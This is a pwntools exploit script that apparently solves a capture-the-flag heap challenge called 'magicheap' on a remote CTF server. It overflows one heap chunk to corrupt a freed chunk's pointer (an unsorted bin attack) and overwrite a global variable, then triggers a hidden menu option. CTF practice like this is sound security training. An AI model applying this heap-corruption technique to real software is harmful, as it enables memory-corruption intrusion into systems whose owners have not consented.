#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

r = remote("csie.ctf.tw", 10144)
#r = process("./magicheap", env = {"LD_PRELOAD": "./libc.so.6"})
#gdb.attach(proc.pidof(r)[0])

def allocate(size, data):
    r.sendlineafter(':', "1")
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', data)

def edit(index, size, data):
    r.sendlineafter(':', "2")
    r.sendlineafter(':', str(index))
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', data)

def free(index):
    r.sendlineafter(':', "3")
    r.sendlineafter(':', str(index))

magic = 0x6020c0

allocate(0x30, "jedi")
allocate(0x80, "jedi")
allocate(0x30, "jedi")

free(1)
edit(0, 0x100, b'A' * 0x30 + flat([0, 0x91, 0, magic - 0x10]))

allocate(0x80, "jedi")

r.sendlineafter(':', "4869")

r.interactive()
